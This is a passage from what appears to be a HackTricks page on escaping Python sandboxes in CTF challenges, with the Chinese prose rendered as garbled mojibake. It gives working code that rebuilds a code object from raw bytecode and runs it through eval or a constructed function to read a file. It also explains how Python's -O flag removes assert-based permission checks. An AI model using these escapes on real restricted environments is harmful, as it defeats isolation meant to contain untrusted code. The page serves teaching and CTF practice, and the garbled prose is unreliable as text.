æ— è®ºå¦‚ä½•ï¼Œæœ‰æ—¶åœ¨æœ¬åœ°æœºå™¨ä¸Š</strong>åˆ›å»º<strong>ä¸€ä¸ª</strong>ç¼–è¯‘å¯¹è±¡<strong>å¹¶åœ¨</strong>CTF æœºå™¨**ä¸Šæ‰§è¡Œå®ƒå¯èƒ½æ˜¯æœ‰ç”¨çš„ï¼ˆä¾‹å¦‚ï¼Œå› ä¸ºæˆ‘ä»¬åœ¨ CTF ä¸­æ²¡æœ‰ <code>compiled</code> å‡½æ•°ï¼‰ã€‚</p>
<p>ä¾‹å¦‚ï¼Œè®©æˆ‘ä»¬æ‰‹åŠ¨ç¼–è¯‘å¹¶æ‰§è¡Œä¸€ä¸ªè¯»å– <em>./poc.py</em> çš„å‡½æ•°ï¼š</p>
<pre><code class="language-python">#Locally
def read():
return open("./poc.py",'r').read()

read.__code__.co_code
't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
</code></pre>
<pre><code class="language-python">#On Remote
function_type = type(lambda: None)
code_type = type((lambda: None).__code__) #Get &lt;type 'type'&gt;
consts = (None, "./poc.py", 'r')
bytecode = 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
names = ('open','read')

# And execute it using eval/exec
eval(code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '&lt;module&gt;', 1, '', (), ()))

#You could also execute it directly
mydict = {}
mydict['__builtins__'] = __builtins__
codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '&lt;module&gt;', 1, '', (), ())
function_type(codeobj, mydict, None, None, None)()
</code></pre>
<p>å¦‚æœæ‚¨æ— æ³•è®¿é—® <code>eval</code> æˆ– <code>exec</code>ï¼Œæ‚¨å¯ä»¥åˆ›å»ºä¸€ä¸ª <strong>é€‚å½“çš„å‡½æ•°</strong>ï¼Œä½†ç›´æ¥è°ƒç”¨å®ƒé€šå¸¸ä¼šå¤±è´¥ï¼Œé”™è¯¯ä¿¡æ¯ä¸ºï¼š<em>æ„é€ å‡½æ•°åœ¨å—é™æ¨¡å¼ä¸‹ä¸å¯è®¿é—®</em>ã€‚å› æ­¤ï¼Œæ‚¨éœ€è¦ä¸€ä¸ª <strong>ä¸åœ¨å—é™ç¯å¢ƒä¸­çš„å‡½æ•°æ¥è°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚</strong></p>
<pre><code class="language-python">#Compile a regular print
ftype = type(lambda: None)
ctype = type((lambda: None).func_code)
f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,), (), ('s',), 'stdin', 'f', 1, ''), {})
f(42)
</code></pre>
<h2 id="åç¼–è¯‘å·²ç¼–è¯‘çš„-python"><a class="header" href="#åç¼–è¯‘å·²ç¼–è¯‘çš„-python">åç¼–è¯‘å·²ç¼–è¯‘çš„ Python</a></h2>
<p>ä½¿ç”¨åƒ <a href="https://www.decompiler.com"><strong>https://www.decompiler.com/</strong></a> è¿™æ ·çš„å·¥å…·ï¼Œå¯ä»¥ <strong>åç¼–è¯‘</strong> ç»™å®šçš„å·²ç¼–è¯‘ Python ä»£ç ã€‚</p>
<p><strong>æŸ¥çœ‹è¿™ä¸ªæ•™ç¨‹</strong>ï¼š</p>
<p>{% content-ref url="../../basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md" %}
<a href="../../basic-forensic-methodology/specific-software-file-type-tricks/.pyc.html">.pyc.md</a>
{% endcontent-ref %}</p>
<h2 id="å…¶ä»–-python"><a class="header" href="#å…¶ä»–-python">å…¶ä»– Python</a></h2>
<h3 id="æ–­è¨€"><a class="header" href="#æ–­è¨€">æ–­è¨€</a></h3>
<p>ä½¿ç”¨å‚æ•° <code>-O</code> æ‰§è¡Œçš„ Python å°†åˆ é™¤æ–­è¨€è¯­å¥å’Œä»»ä½•åŸºäº <strong>debug</strong> å€¼çš„æ¡ä»¶ä»£ç ã€‚<br />
å› æ­¤ï¼Œæ£€æŸ¥åƒ</p>
<pre><code class="language-python">def check_permission(super_user):
try:
assert(super_user)
print("\nYou are a super user\n")
except AssertionError:
print(f"\nNot a Super User!!!\n")
</code></pre>
<p>å°†è¢«ç»•è¿‡</p>
<h2 id="å‚è€ƒæ–‡çŒ®"><a class="header" href="#å‚è€ƒæ–‡çŒ®">å‚è€ƒæ–‡çŒ®</a></h2>
<ul>
<li><a href="https://lbarman.ch/blog/pyjail/">https://lbarman.ch/blog/pyjail/</a></li>
<li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/</a></li>
<li><a href="https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/">https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/</a></li>
<li><a href="https://gynvael.coldwind.pl/n/python_sandbox_escape">https://gynvael.coldwind.pl/n/python_sandbox_escape</a></li>
<li><a href="https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html">https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html</a></li>
<li><a href="https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6">https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6</a></li>
</ul>
<figure><img src="../../../.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
<p><strong>ä»é»‘å®¢çš„è§’åº¦çœ‹å¾…æ‚¨çš„ç½‘ç»œåº”ç”¨ç¨‹åºã€ç½‘ç»œå’Œäº‘</strong></p>
<p><strong>å‘ç°å¹¶æŠ¥å‘Šå…·æœ‰å®é™…å•†ä¸šå½±å“çš„å…³é”®å¯åˆ©ç”¨æ¼æ´ã€‚</strong> ä½¿ç”¨æˆ‘ä»¬20å¤šä¸ªè‡ªå®šä¹‰å·¥å…·æ¥æ˜ å°„æ”»å‡»é¢ï¼ŒæŸ¥æ‰¾è®©æ‚¨æå‡æƒé™çš„å®‰å…¨é—®é¢˜ï¼Œå¹¶ä½¿ç”¨è‡ªåŠ¨åŒ–æ¼æ´æ”¶é›†é‡è¦è¯æ®ï¼Œå°†æ‚¨çš„è¾›å‹¤å·¥ä½œè½¬åŒ–ä¸ºæœ‰è¯´æœåŠ›çš„æŠ¥å‘Šã€‚</p>
<p>{% embed url="https://pentest-tools.com/?utm_term=jul2024&amp;utm_medium=link&amp;utm_source=hacktricks&amp;utm_campaign=spons" %}</p>
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µAWSé»‘å®¢æ”»å‡»ï¼š<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶ï¼ˆARTEï¼‰</strong></a><img src="../../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µGCPé»‘å®¢æ”»å‡»ï¼š<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶ï¼ˆGRTEï¼‰</strong><img src="../../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒHackTricks</summary>
<ul>
<li>æŸ¥çœ‹<a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discordç¾¤ç»„</strong></a>æˆ–<a href="https://t.me/peass"><strong>ç”µæŠ¥ç¾¤ç»„</strong></a>æˆ–<strong>åœ¨</strong> <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a>å’Œ<a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> githubä»“åº“æäº¤PRæ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../../generic-methodologies-and-resources/python/index.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../../generic-methodologies-and-resources/python/bypass-python-sandboxes/load_name-load_const-opcode-oob-read.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../../generic-methodologies-and-resources/python/index.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../../generic-methodologies-and-resources/python/bypass-python-sandboxes/load_name-load_const-opcode-oob-read.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../../elasticlunr.min.js"></script>
        <script src="../../../mark.min.js"></script>
        <script src="../../../searcher.js"></script>

        <script src="../../../clipboard.min.js"></script>
        <script src="../../../highlight.js"></script>
        <script src="../../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
